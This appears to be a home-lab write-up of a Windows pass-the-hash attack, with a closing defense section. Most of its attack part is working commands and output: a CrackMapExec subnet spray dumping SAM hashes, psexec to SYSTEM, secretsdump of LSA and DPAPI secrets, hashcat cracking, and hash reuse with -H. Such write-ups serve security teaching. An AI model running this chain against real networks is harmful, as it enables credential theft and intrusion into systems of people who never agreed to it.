# Pass The Hash

**Date:** May 2026  
**Author:** ShahinSecLab  
**Category:** Network Attack / Credential Capture  
**Difficulty:** Easy  
**Tools:** Responder, Hashcat 

## Table of Contents

- [Overview](#whats-the-point)
- [How NTLM Auth Actually Works](#how-ntlm-auth-actually-works)
- [Lab Setup](#lab-setup)
- [Step 1 — Spray Network and Dump SAM Hashes with CrackMapExec](#step-1--spray-network-and-dump-sam-hashes-with-crackmapexec)
- [Step 2 — Deeper Dump with secretsdump](#step-2--deeper-dump-with-secretsdump)
- [Step 3 — Save the Hashes](#step-3--save-the-hashes)
- [Step 4 — Crack the Hashes with Hashcat](#step-4--crack-the-hashes-with-hashcat)
- [Step 5 — Pass the Hash with CrackMapExec](#step-6--pass-the-hash-with-crackmapexec)
- [Step 6 — Get a Shell with psexec](#step-7--get-a-shell-with-psexec)
- [Full Attack Summary](#full-attack-summary)



## Overview

Pass the Hash is one of those attacks that sounds complicated but is actually pretty straightforward once you get it. The short version: Windows stores your password as a hash, and when you authenticate over the network, it uses that hash — not your actual password. So if you steal someone's hash, you can log in as them without ever knowing their password.
No cracking. No brute forcing. Just grab the hash and use it.
It's been around since the late 90s and it's still one of the go-to moves for moving sideways through a Windows domain. Once you're on one machine, PtH can get you to every other machine where that account has admin rights.

## How NTLM Auth Actually Works

When Windows needs to prove who you are over the network, it uses NTLM. Here's the back-and-forth:

```
Client                          Server
  |                                |
  |---- "Hey I want to log in" --> |
  |<--- "Prove it, here's a nonce" |
  |---- Hash(your_hash + nonce) -> |
  |<--- "OK you're in"             |
  ```

The thing to notice: the server never asks for your password. It asks for a response that was computed using your hash. So if you have the hash, you can compute the same response. The server can't tell the difference.
Windows uses MD4 to turn your password into a hash (this is the NT hash). That hash lives in memory while you're logged in, sitting in a process called LSASS. That's exactly where tools like Mimikatz go looking.

## Lab Setup

 ```
| Machine | Operating System |         Role          |    Ip         |
|---------|------------------|-----------------------|---------------|
| Attacker| Kali Linux       | Attacker machine      | 192.168.5.128 |
| Server  | Windows Server   | Domain Controller     | 192.168.5.134 |
| Victim  | Windows 10       | Domain joined machine | 192.168.5.135 |
 ```

## Step 1 — First Scan With CrackMapExec and Pull Hashes

I had rahimkhan's password from earlier. Ran CrackMapExec across the whole subnet to see which machines I could get into, and added --sam to pull hashes from any machine it logged into:

```bash
crackmapexec smb 192.168.5.0/24 -u rahimkhan -d READTEAMBD.local -p Password1 --sam
```
Output:

```
SMB         192.168.5.136   445    VICTIM-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:VICTIM-2) (domain:READTEAMBD.local) (signing:False) (SMBv1:False)
SMB         192.168.5.135   445    VICTIM-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:VICTIM-1) (domain:READTEAMBD.local) (signing:False) (SMBv1:False)
SMB         192.168.5.134   445    REDTEAMBD-DC     [*] Windows Server 2022 Build 20348 x64 (name:REDTEAMBD-DC) (domain:READTEAMBD.local) (signing:True) (SMBv1:False)
SMB         192.168.5.136   445    VICTIM-2         [+] READTEAMBD.local\rahimkhan:Password1 (Pwn3d!)
SMB         192.168.5.135   445    VICTIM-1         [+] READTEAMBD.local\rahimkhan:Password1 (Pwn3d!)
SMB         192.168.5.134   445    REDTEAMBD-DC     [+] READTEAMBD.local\rahimkhan:Password1 
SMB         192.168.5.136   445    VICTIM-2         [+] Dumping SAM hashes
SMB         192.168.5.135   445    VICTIM-1         [+] Dumping SAM hashes
SMB         192.168.5.135   445    VICTIM-1         Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.5.135   445    VICTIM-1         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.135   445    VICTIM-1         DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.135   445    VICTIM-1         WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58de7b52b01e171824c8aeaa55fb1a89:::
SMB         192.168.5.135   445    VICTIM-1         rahim:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.5.135   445    VICTIM-1         [+] Added 5 SAM hashes to the database
SMB         192.168.5.136   445    VICTIM-2         Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.136   445    VICTIM-2         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.136   445    VICTIM-2         DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.136   445    VICTIM-2         WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6f3ff0667b23a61adbffbe71a1e8dd8b:::
SMB         192.168.5.136   445    VICTIM-2         defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:337b1d18e8d0a8405c907048fdfbbae2:::
SMB         192.168.5.136   445    VICTIM-2         karim:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.5.136   445    VICTIM-2         [+] Added 6 SAM hashes to the database
```

rahimkhan has local admin on both VICTIM-1 and VICTIM-2 — that's what (Pwn3d!) means. The DC logged in fine but no Pwn3d because domain controllers work differently with local admin.
One thing to notice — VICTIM-1's Administrator and rahim have the exact same NT hash (64f12cdd...). VICTIM-2's karim has that same hash too. So all three accounts have the same password.

<p align="center">
  <img src="/writeups/pass the hash/images/step1-1.png" width="600">
</p>

I then tried psexec into VICTIM-1 using rahimkhan — that succeed:

```bash
psexec.py readteambd/rahimkhan:Password1@192.168.5.135
```

```
[*] Found writable share ADMIN$
[*] Uploading file 8Slpmu2.exe
[*] Opening SVCManager on 192.168.5.135
[*] Starting service vJfn

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
Victim-1
```

<p align="center">
  <img src="/writeups/pass the hash/images/step1-2.png" width="600">
</p>

I'm SYSTEM on VICTIM-1. Now I want to do a proper full hash dump.

## Step 2 — Run secretsdump for Full Hash Dump

CME already grabbed the SAM hashes, but secretsdump gives more — cached domain logins, LSA secrets, machine account keys. Ran it against both machines:

VICTIM-1:

```

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x6608255fec750bd36510ab28b84600b1
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58de7b52b01e171824c8aeaa55fb1a89:::
rahim:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Dumping cached domain logon information (domain/username:hash)
READTEAMBD.LOCAL/Administrator:$DCC2$10240#Administrator#e82d48bcd598cafade91e02c44001bcb
READTEAMBD.LOCAL/rahimkhan:$DCC2$10240#rahimkhan#f3ae9b5061b3126512ee3dc3d5ad6736
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
READTEAMBD\VICTIM-1$:aes256-cts-hmac-sha1-96:14e03c91b7591eeadf3b1cc00424446695535d3ccfa0a17e15bc712270a90d76
READTEAMBD\VICTIM-1$:aes128-cts-hmac-sha1-96:a29a72336c96029edac48f600795b1f0
READTEAMBD\VICTIM-1$:des-cbc-md5:d67c382016f443b9
READTEAMBD\VICTIM-1$:aad3b435b51404eeaad3b435b51404ee:a5fe1d0dc9eb932036cba4e74ff64bac:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xe194f0486d5dc1ce67698f0f5ee9ac4bb2ea35ef
dpapi_userkey:0x1280472b70f87a45367400a7ae2b8b8fc127e398
[*] NL$KM 
 0000   4B 8F CA 52 BF 95 F1 83  BD 04 4D 00 F5 06 D9 A5   K..R......M.....
 0010   D7 AC C0 E8 E5 95 E9 3C  EA B7 40 AE 2E 58 3A FA   .......<..@..X:.
 0020   CB D8 30 18 5A 54 D3 22  51 11 9C 94 5D 1B DC 02   ..0.ZT."Q...]...
 0030   A4 11 1A AB C0 B3 BE A0  95 8E 40 B9 75 3D 49 A7   ..........@.u=I.
NL$KM:4b8fca52bf95f183bd044d00f506d9a5d7acc0e8e595e93ceab740ae2e583afacbd830185a54d32251119c945d1bdc02a4111aabc0b3bea0958e40b9753d49a7
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```
<p align="center">
  <img src="/writeups/pass the hash/images/step2-1.png" width="600">
</p>


VICTIM-2:
```
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x26daf3e3d4c1f8aa07b2b91228d60a55
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6f3ff0667b23a61adbffbe71a1e8dd8b:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:337b1d18e8d0a8405c907048fdfbbae2:::
karim:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Dumping cached domain logon information (domain/username:hash)
READTEAMBD.LOCAL/Administrator:$DCC2$10240#Administrator#e82d48bcd598cafade91e02c44001bcb
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
READTEAMBD\VICTIM-2$:aes256-cts-hmac-sha1-96:988227393fdc3358ccfab5fe9c223e465c0e6cc7a2c924c080c430f667ee0fbf
READTEAMBD\VICTIM-2$:aes128-cts-hmac-sha1-96:24c5e3a094f1ae6c51014e95e6f9e3fd
READTEAMBD\VICTIM-2$:des-cbc-md5:efc180d354075820
READTEAMBD\VICTIM-2$:aad3b435b51404eeaad3b435b51404ee:241691b698e90567f10688cbeb494357:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xc9fe733ed67c2e131c76f5aae18a49435003e3b2
dpapi_userkey:0x76579e18b9cafed8ddc74b135f34617eaea84a50
[*] NL$KM 
 0000   C7 B7 B5 BD A0 D3 3E 86  62 BF FB 11 E1 89 9A B8   ......>.b.......
 0010   AA EB B5 B8 79 48 11 5F  CB EC C5 99 35 10 E8 60   ....yH._....5..`
 0020   44 27 D5 CB 0A D9 91 9A  F1 56 EF 17 23 30 69 0F   D'.......V..#0i.
 0030   DF 98 14 95 EC 51 7D 16  11 9E 12 61 6C 1C 28 CE   .....Q}....al.(.
NL$KM:c7b7b5bda0d33e8662bffb11e1899ab8aaebb5b87948115fcbecc5993510e8604427d5cb0ad9919af156ef172330690fdf981495ec517d16119e12616c1c28ce
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```
<p align="center">
  <img src="/writeups/pass the hash/images/step2-2.png" width="600">
</p>

## Step 3 — Put the Hashes in a File

Opened a file and dropped in the hashes I want to crack and use:

```bash
nano passthehash.txt
```

## Step 4 — Crack the Hashes With Hashcat

Run:

```bash
hashcat -m 1000 passthehash.txt /usr/share/wordlists/rockyou.txt
```
-m 1000 tells hashcat these are NTLM hashes.

Results:

```
64f12cddaa88057e06a81b54e73b949b:Password1                
31d6cfe0d16ae931b73c59d7e0c089c0:                         
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1000 (NTLM)
Hash.Target......: passthehash.txt
Time.Started.....: Thu May 28 14:17:14 2026 (8 secs)
Time.Estimated...: Thu May 28 14:17:22 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1848.3 kH/s (0.21ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 2/4 (50.00%) Digests (total), 2/4 (50.00%) Digests (new)
Progress.........: 14344387/14344387 (100.00%)
Rejected.........: 0/14344387 (0.00%)
Restore.Point....: 14344387/14344387 (100.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...:  laylanie -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#01.: Util: 23%
```

Password1 is the password behind 64f12cdd... — so Administrator on VICTIM-1, rahim, and karim all use Password1. The other hash 31d6cfe0... is an empty password — that's Guest, DefaultAccount.

<p align="center">
  <img src="/writeups/pass the hash/images/step4-1.png" width="600">
</p>

# Step 5 — Pass the Hash

Now I skip the password completely and just use the hash with -H. Two tries here.

```bash
crackmapexec smb 192.168.5.0/24 -u administrator -H 64f12cddaa88057e06a81b54e73b949b --local-auth
```

Result:

```
SMB         192.168.5.136   445    VICTIM-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:VICTIM-2) (domain:VICTIM-2) (signing:False) (SMBv1:False)
SMB         192.168.5.135   445    VICTIM-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:VICTIM-1) (domain:VICTIM-1) (signing:False) (SMBv1:False)
SMB         192.168.5.136   445    VICTIM-2         [-] VICTIM-2\administrator:64f12cddaa88057e06a81b54e73b949b STATUS_LOGON_FAILURE 
SMB         192.168.5.135   445    VICTIM-1         [+] VICTIM-1\administrator:64f12cddaa88057e06a81b54e73b949b (Pwn3d!)
```

VICTIM-1 hit. VICTIM-2 failed because its local Administrator has a different hash (31d6cfe0... — blank password). The hash I'm passing only works on machines where Administrator has Password1.

<p align="center">
  <img src="/writeups/pass the hash/images/step5-1.png" width="600">
</p>

## Defense / Mitigation

Pass-the-Hash works because stolen NTLM hashes can still be reused for authentication. The goal of defense is to stop hash reuse and limit where credentials can travel.

### 1. Disable or Reduce NTLM Usage
- Prefer Kerberos authentication instead of NTLM
- Restrict NTLM where possible using Group Policy
- Monitor systems still using NTLM

### 2. Enable Credential Guard
- Isolates and protects credentials from memory extraction
- Prevents tools from accessing LSASS easily

### 3. Use Unique Local Administrator Passwords
- Never reuse the same local admin password across machines
- Use tools like LAPS (Local Administrator Password Solution)

### 4. Apply Least Privilege
- Users should not have admin rights unless required
- Separate admin accounts from normal user accounts
- Avoid logging in as Domain Admin on workstations

### 5. Limit Lateral Movement
- Segment the network (users, servers, DCs)
- Restrict SMB (port 445) between workstations where possible
- Block admin shares from non-admin systems

### 6. Protect LSASS Process
- Enable RunAsPPL (Protected Process Light)
- Prevent credential dumping from memory

### 7. Patch and Update Systems
- Keep Windows and domain controllers updated
- Fix known SMB and authentication vulnerabilities

---

## Key Takeaways

- Pass-the-Hash does NOT need the real password
- NTLM hashes can be reused directly for authentication
- Reusing local admin passwords makes lateral movement easy
- One compromised machine can lead to full domain access
- Kerberos + proper privilege separation reduces risk significantly
- Monitoring authentication logs is critical in detection

---

## References

- https://attack.mitre.org/techniques/T1550/002/ (Pass-the-Hash - MITRE ATT&CK)
- https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview (NTLM Authentication - Microsoft)
- https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/ (Credential Guard - Microsoft)
- https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview (Microsoft LAPS)
                                                                                